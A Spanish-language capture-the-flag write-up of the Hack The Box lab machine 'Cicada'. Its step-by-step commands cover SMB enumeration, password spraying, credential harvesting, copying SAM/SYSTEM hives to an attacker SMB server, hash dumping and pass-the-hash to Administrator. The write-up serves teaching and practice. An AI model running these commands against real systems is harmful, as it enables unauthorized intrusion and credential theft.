![Cicada](https://github.com/user-attachments/assets/eb28d3af-c5cc-4206-9579-0979abc20137)


Comenzamos escaneando los puertos abiertos de la máquina objetivo.

``sudo nmap 10.10.11.35 -sS -p- --open --min-rate 5000 -n -Pn -oG allPorts``

![Pasted image 20250318103259](https://github.com/user-attachments/assets/ff9283af-c20a-43cc-8a8c-cecbde27b344)

Dado este output, podemos empezar a pensar que estamos ante un DC. No obstante, vamos a ver con exactitud qué servicios y versiones están corriendo en estos puertos.

``nmap 10.10.11.35 -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,5985,57500 -oN target -Pn``

![Pasted image 20250318103431](https://github.com/user-attachments/assets/d502e243-12a3-4a04-8077-1b59a06516f5)

De este output podemos extraer cositas, como que el dominio es cicada.htb y el nombre de la máquina es cicada-dc. 

Vamos a recolectar un poco más de información sobre la máquina.

``netexec smb 10.10.1.35``

![Pasted image 20250318104501](https://github.com/user-attachments/assets/a8e0a070-56a2-4df1-9b1a-367075bf0fb2)

Confirmamos la información que teníamos desde el output de nmap y que es un WS2022.

Podemos añadir esta información a nuestro /etc/hosts.

![Pasted image 20250318104605](https://github.com/user-attachments/assets/6c3b9a90-8c4d-4826-a323-49313230092b)

Probamos a enumerar los recursos disponibles por SMB para el usuario guest:

``netexec smb 10.10.11.35 -u 'guest' -p '' --shares``

![Pasted image 20250318104731](https://github.com/user-attachments/assets/03c031e0-65c8-4ce5-858e-e61d44754e0d)

Aparecen cosas interesantes y que no están por default, como el permiso de lectura para HR (HumanResources?).

Vamos a conectarnos por SMB para echarle un vistazo más a fondo.

``smbclient //10.10.11.35/HR -U 'guest'``

![Pasted image 20250318105030](https://github.com/user-attachments/assets/42cbe277-13f8-4e5f-ae39-6ce81f698f36)

Vemos que existe un archivo llamado "Notice from HR.txt". Nos traemos el archivo a la máquina atacante para analizar su contenido.

![Pasted image 20250318105403](https://github.com/user-attachments/assets/f888e9da-e7ab-4900-81e4-528be9ee49fb)

Podemos visualizar cositas interesantes. Parece un mensaje default para nuevas contrataciones en la compañía Cicada. Lo primero (y más importante) que menciona es la importancia de cambiar la contraseña default 'Cicada$M6Corpb*@Lp#nZp!8'. Sin embargo, no tenemos el usuario al que está haciendo referencia.

Dado que con el usuario guest podemos enumerar los archivos compartidos, vamos a probar a utilizar --rid-brute para enumerar usuarios.

``netexec smb 10.10.11.35 -u 'guest' -p '' --rid-brute``

![Pasted image 20250318112623](https://github.com/user-attachments/assets/9b31db8e-a51a-48bb-81ce-186618c0f9eb)

Bien. Nos saca output. Lo que vamos a hacer es redirigirlo todo a un archivo para hacer un tratamiento de los datos para quedarnos sólo con los nombres de usuario y generar un diccionario de usuarios.

``netexec smb 10.10.11.35 -u 'guest' -p '' --rid-brute > smbusers.txt``

Una vez tenemos todo el output en un archivo, hacemos el tratamiento de datos.

``cat smbusers.txt | grep 'SidTypeUser'| cut -f2 -d '\' | cut -f1 -d '(' | cut -f1 -d ' ' > users.txt``

![Pasted image 20250318114113](https://github.com/user-attachments/assets/57633c2c-b1e5-448a-9a7e-041e965228e8)

Una vez tenemos el diccionario de usuarios, vamos a identificar si todos son usuarios válidos (que deberían):

``kerbrute userenum --dc 10.10.11.35 -d cicada.htb users.txt``

![Pasted image 20250318114214](https://github.com/user-attachments/assets/a0f40542-614f-4b37-b74e-3602321686c4)

Genial. Los usuarios que tenemos son usuarios reales.

Ahora vamos a hacer uso de la técnica password spraying con la contraseña que hemos obtenido en el archivo compartido por SMB con los usuarios que tenemos:

``netexec smb 10.10.11.35 -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8' --continue-on-success``

![Pasted image 20250318122124](https://github.com/user-attachments/assets/7a771c02-c50c-4a13-9feb-2b89c4e74fc6)

Ojo, tenemos un [+] para el usuario michael.wrightson, por lo que tenemos credenciales válidas.

michael.wrightson : Cicada$M6Corpb*@Lp#nZp!8 

Sin embargo, si lanzamos netexec para winrm vemos que no tenemos un [+], por lo que este usuario no forma parte del grupo Remote Management Users y no podemos conectarnos usando evil-winrm. Seguimos enumerando.

Si nos conectamos por RPC para enumerar un poquito más:

``rpcclient -U 'michael.wrightson%Cicada$M6Corpb*@Lp#nZp!8' 10.10.11.35``

-> querydispinfo

![Pasted image 20250318130434](https://github.com/user-attachments/assets/44c9b0cc-02ef-4f6b-9c69-26e5cdded22b)

Muy interesante. La descripción del usuario david.orelious es:

``Just in case I forget my password is aRt$Lp#7t*VQ!3``

Tenemos una posible contraseña del usuario david.orelious. Vamos a validar esta credencial con netexec:

``netexec smb 10.10.11.35 -u david.orelious -p 'aRt$Lp#7t*VQ!3'``

![Pasted image 20250318130621](https://github.com/user-attachments/assets/d631704f-da47-42b1-b7a0-f5db56ac0c9b)


Son credenciales válidas, pero tampoco forma parte del grupo Remote Management Users (igual que antes, netexec para winrm no reporta pwn3d), por lo que seguimos sin poder conectarnos a la máquina víctima.

Sin embargo, si vemos lo que se está compartiendo en SMB para este usuario:

``netexec smb 10.10.11.35 -u david.orelious -p 'aRt$Lp#7t*VQ!3' --shares``

![Pasted image 20250318130854](https://github.com/user-attachments/assets/edc69a88-6ec4-415d-8118-1da249755608)

El directorio DEV que se está compartiendo suena bastante interesante y tenemos permisos de lectura. Vamos a indagar.

``smbclient //10.10.11.35/DEV -U 'david.orelious%aRt$Lp#7t*VQ!3'``

![Pasted image 20250318131033](https://github.com/user-attachments/assets/90a8d5bc-4bdf-463a-bc8b-97a7ab5df06c)

Nos traemos a la máquina víctima ese Backup_script.ps1 y le echamos un vistazo:

![Pasted image 20250318132822](https://github.com/user-attachments/assets/21fc8717-35b1-422c-a831-190a8b499514)


Se encuentran claramente unas credenciales:
emily.oscars : Q!3@Lp#M6b*7t*Vt

Vamos a validarlas con netexec.

![Pasted image 20250318132949](https://github.com/user-attachments/assets/0167e75e-bd81-437a-941f-1d76e0539599)


Son credenciales válidas. Y si las probamos para winRM:

![Pasted image 20250318133030](https://github.com/user-attachments/assets/188d617a-f6fd-43aa-b46a-bc7f7b8c178f)

Bingo, tenemos Pwn3d!
Por fin un usuario que forma parte del grupo Remote Management Users y que nos permite conectarnos.

Nos conectamos con evilwin-rm:

``evil-winrm -i 10.10.11.35 -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'``

![Pasted image 20250318133343](https://github.com/user-attachments/assets/063bfbb7-faa3-4440-9ce3-a42254495983)

Estamos dentro de la máquina víctima como el usuario emily.oscars.

Dentro de C:\Users\emily.oscars\Desktop encontramos la flag de usuario:

![Pasted image 20250318133546](https://github.com/user-attachments/assets/0883a5d5-96d9-4723-8001-c34a5f4fe676)



# PRIVESC

``whoami /priv``

![Pasted image 20250318133801](https://github.com/user-attachments/assets/c62fbc60-9a56-405d-b014-03d952af42da)

El usuario tiene el privilegio SeBackupPrivilege. Muy buenas noticias.

Nos creamos una carpeta temp en C:\

![Pasted image 20250318133829](https://github.com/user-attachments/assets/3b5fa189-4b81-4618-b2e0-df1103940481)

Para explotar este privilegio vamos a hacer una copia de SAM y SYSTEM que nos permitirá tener los hashes LM:NTLM de los demás usuarios.

``reg save hklm\sam c:\temp\sam``

``reg save hklm\system c:\temp\system``

![Pasted image 20250318133929](https://github.com/user-attachments/assets/cd2368d8-55e8-46bc-a160-20bcaf09e5c6)


Vamos a compartir ambos recursos con la máquina atacante, para ello:

- Abrimos smbserver en máquina atacante:
  
``impacket-smbserver -smb2support test .``

- Desde máquina víctima realizamos la copia de ambos recursos (sam y system) en el servidor SMB de la máquina atacante:
  
``copy sam \\10.10.14.16\test\sam``

``copy system \\10.10.14.16\test\system``

![Pasted image 20250318134115](https://github.com/user-attachments/assets/1adf0f5e-6114-40ec-ba06-a347e0f88740)


Una vez lo tenemos en máquina víctima, combinamos ambos archivos a través del uso de impacket-secretsdump:

``impacket-secretsdump -sam sam -system system LOCAL > sam.hashes``

Si observamos el contenido del archivo:

![Pasted image 20250318134748](https://github.com/user-attachments/assets/b1e0d5f8-0daf-4e02-8d82-5e28ddb67e6c)


Estupendo. Tenemos un posible hash NTLM del usuario Administrator. Vamos a validarlo vía netexec realizando pass the hash:

``netexec smb 10.10.11.35 -u Administrator -H ':2b87e7c93a3e8a0ea4a581937016f341'``

![Pasted image 20250318134823](https://github.com/user-attachments/assets/b7a48503-aae7-45eb-9106-08a53c40bbed)

Tenemos [+] y Pwn3d!, por lo que, no sólo son credenciales válidas, sino que podemos hacer uso directo de psexec para conectarnos a la máquina víctima:

``impacket-psexec administrator@10.10.11.35 -hashes ':2b87e7c93a3e8a0ea4a581937016f341'``

![Pasted image 20250318135407](https://github.com/user-attachments/assets/919b50ed-4635-45f5-89d3-493b9349da14)

Podemos recogemr la flag de Administrador en C:\Users\Administrator\Desktop:

![Pasted image 20250318135514](https://github.com/user-attachments/assets/ea0cfadd-332e-46f8-80ec-ee918deaece3)
